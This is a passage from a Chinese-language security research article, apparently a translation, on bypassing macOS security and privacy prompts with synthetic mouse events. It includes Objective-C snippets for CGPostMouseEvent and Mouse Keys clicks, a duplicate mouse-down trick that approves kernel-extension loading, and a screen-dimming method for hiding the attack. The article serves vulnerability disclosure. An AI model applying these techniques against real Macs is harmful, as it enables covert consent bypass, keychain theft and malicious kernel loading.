        //let it finish
        sleep(1);
        //clicky clicky
        CGPostMouseEvent(CGPointMake(X, Y), true, 1, true);
        CGPostMouseEvent(CGPointMake(X, Y), true, 1, false);
        return;
    }
由于Apple只会保护某些UI组件（比如安全性警告组件）免受”合成“事件的干扰，而这些UI组件并没有受到保护，因此我们操作起来一切顺利：
在启用”Mouse
Keys“功能时，为了生成鼠标点击事件，我们首先需要移动鼠标，然后通过`AppleScript`来发送”合成的“键盘事件。更具体一些，我们合成的是`87`这个键码（keycode）：
    //click via mouse key
    void clickAllow(float X, float Y)
    {
       //move mouse
       CGEventPost(kCGHIDEventTap, CGEventCreateMouseEvent(nil, kCGEventMouseMoved,
                   CGPointMake(X, Y), kCGMouseButtonLeft));
       //apple script
       NSAppleScript* script = [[NSAppleScript alloc] initWithSource:
                                @"tell application "System Events" to key code 87n"];
       //exec
       [script executeAndReturnError:nil];
    }
在启用”Mouse
Keys“时，当我们”按下“`87`键码（对应的是数字键`5`）时（即使通过代码方式也可以），系统就会将其转换为一次鼠标点击！大家可以使用我开源的[SniffMK](https://github.com/objective-see/sniffMK)鼠标键盘嗅探工具来观察这个现象：
    # ./sniffMK
    event: key down
    keycode: 0x57/87/5
    event: key up
    keycode: 0x57/87/5
    event: left mouse down
    (x: 146.207031, y: 49.777344)
    event: left mouse up
    (x: 146.207031, y: 49.777344)
由于操作系统会把键盘事件转化为鼠标事件，然后”传递“鼠标事件（点击），这样即便受保护的UI组件也会接受并处理这个事件！（一般来说，如果事件来源为操作系统时，这种受保护的组件会信任这些”合成的“事件）。
那么这个功能可以发挥什么作用？非常有用……比如可以转储或者提取用户keychain中所有私钥及未加密的密码，如[这个视频](https://vimeo.com/235313957)所示。
我已经将这个漏洞反馈给Apple，Apple在High Sierra的增量更新中将其标记为CVE-2017-7150加以修复：
但”合成“的幽灵依然阴魂不散！
首先，我注意到各种隐私相关的警告窗口会盲目地接受这种改造后的鼠标事件（即使是在打全补丁的macOS
10.13.*环境中）。比如，在最近版本的macOS上，当代码尝试访问如下数据时，系统会显示警告窗口：
    系统（以及用户）的地理位置
    用户的联系人信息
    用户的日程事件
    其他数据
由于这些警告窗口会接受”合成的“事件，恶意软件可以在代码中简单绕过限制：
    //given some point {x, y}
    // generate synthetic event...
    CGPostMouseEvent(point, true, 1, true);
    CGPostMouseEvent(point, true, 1, false);
如下PoC动图展示了如何通过攻击方式绕过系统警告窗口，确定用户的地理位置：
大家可能会好奇：”既然恶意软件可以轻松绕过，为什么Apple还坚持弹出警告窗口“？我不知道具体原因，可能他们可以给出自己的解释。
现在还有另一个更加严重的问题。这个问题会导致无特权的恶意软件或者攻击者与”受保护的“UI组件（如High Sierra的”User Assisted
Kernel Loading“（用户辅助内核加载）接口）交互，并且这种方法也适用于打全补丁的macOS 10.6.*系统，非常糟糕。
发现这个问题源自于一次尴尬的意外，当时我想测试Apple对CVE-2017-7150的修复情况，但错误剪切并粘贴了一些代码，结果意外得到了一个0day！
前面提到过我们可以通过`CoreGraphics`方式发送”合成的“鼠标事件，正常情况下，对于这类鼠标点击方式，我们需要发送两个事件：鼠标按下事件，然后是鼠标松开事件：
    //given some point {x, y}
    // generate synthetic event...
    //final param: true => mouse down
    CGPostMouseEvent(point, true, 1, true);
    //final param: false => mouse up
    CGPostMouseEvent(point, true, 1, false);
然而，如果有人拷贝并粘贴了第一行代码`CGPostMouseEvent(point, true, 1,
true);`，并且忘记把最后一个参数从`true`修改为`false`（表示鼠标松开），这样就会生成两次鼠标按下事件。
理论上说这么做会被系统忽略掉，然而事实并非如此。通过`SniffMK`工具，我们可以观察到系统会将第二个（无效的）鼠标按下动作转化为鼠标松开动作：
    # ./sniffMK
    event: left mouse down
    event source pid 951
    event state 0 (synthetic)
    (x: 1100.000000, y: 511.000000)
    event: left mouse up
    event source pid 0
    event state 0 (synthetic)
    (x: 1100.000000, y: 511.000000)
第二个鼠标按下事件变成鼠标松开事件并不是什么大问题，问题在于这个动作由操作系统来执行，这意味着事件的`source process
id`（源进程ID）为`0`（即OS/system）。我们提到过，UI（包括安全提示窗口以及其他受保护的组件）会接受来自系统（pid为`0`）的”合成的“事件。比如，如果发送一个典型的鼠标按下/松开事件到”User
Assisted Kernel Loading“接口的”Allow“按钮时，这些事件会被忽略掉，产生如下错误信息：
    $ log stream | grep mouse
    Dropping mouse down event because sender's PID (899) isn't 0 or self (828)
然而如果pid为`0`呢？事实上这种操作就会被允许：
非常好，现在我们已经可以通过编程方式允许加载内核扩展，即使是在打全补丁的High Sierra系统上也毫无压力。
在OSX/macOS上，用户总是需要以root身份才能加载这种扩展。因此这种攻击方法能给我们带来什么效果？或者换个说法，”User Assisted
Kernel Loading“的意义何在？
在最近版本的macOS上，我们不仅需要以root身份来加载kext，同时kext还需要带有合法签名，而想从Apple那获取内核的代码签名证书几乎是不可能完成的任务。
然而攻击者还可以执行如下操作（我在2016年DefCon[演讲](https://speakerdeck.com/patrickwardle/defcon-2016-i-got-99-problems-but-little-snitch-aint-one)上也提到过)：
1、加载存在已知漏洞的第三方驱动（带有合法签名）；
2、利用已知漏洞来内核上下文中的任意代码执行权限。
Apple对这种攻击方式给出的解决方案是”User Assisted Kernel
Loading“，该接口要求用户必须手动批准任意kext的加载动作，但我们刚刚才看到这种”安全“机制曾出现过问题（CVE-2017-7150），并且仍然被我们无情地打破。那么谁是受害者？那就是与攻击者不是一类人的第三方开发者，他们只能遵循Apple制定的游戏规则来玩
🙁
## 五、隐身性分析
使用”合成“事件的这类攻击技术有一个明显的缺点，那就是攻击过程被用户一览无遗。
想象一下，当用户安坐在办公桌的Mac主机前，突然有个警告出现，而鼠标竟然会自动移动，然后点击解除警告窗口，傻子都知道自己被攻击了！
（对攻击者和恶意软件来说）幸运的是，解决办法也非常简单，只需要调暗屏幕即可：
当屏幕亮度变为`0.0`时，UI仍然”存在“并且处于活动状态（相对比屏幕被锁定或者屏保程序运行时）。然而，这些界面对用户来说似乎处于”关闭“状态，因此任何”合成“攻击都会隐藏在用户眼皮底下。
现在（作为攻击者）我们需要确保找到合适的机会调暗屏幕，比如：
1、用户一定时间没有操作时（使用`CGEventSourceSecondsSinceLastEventType` API获取这个信息）；
2、当屏幕即将休眠时。
在第二种情况下，代码可以检测显示器什么时候会进入休眠（通过`kIOMessageCanDevicePowerOff`通知）。此时程序可以将屏幕亮度快速调节为`0.0`，然后在屏幕休眠前快速执行各种”合成“攻击：
## 六、总结
通过使用”合成的“事件，恶意软件或者本地攻击者可以绕过macOS内置的各种安全机制：
虽然Apple已经知道这种攻击向量，也尝试过保护系统中与安全和隐私有关的UI组件，但攻击者还是简单地打破了这个屏障。即使在打全补丁的High
Sierra系统上，这种”合成式“交互操作还是非常容易，可以于无形之中绕过这类UI组件。
（对我们Mac用户而言）好消息在于在macOS
Mojave（10.14）上，这类”合成的“事件会在全局上被系统忽略掉（除非用户显式赋予某个应用这种权限）。虽然这种方法会影响各种合法的应用，但从安全角度来看，这又是正确的方法，所以我们就尽情享受这一点吧！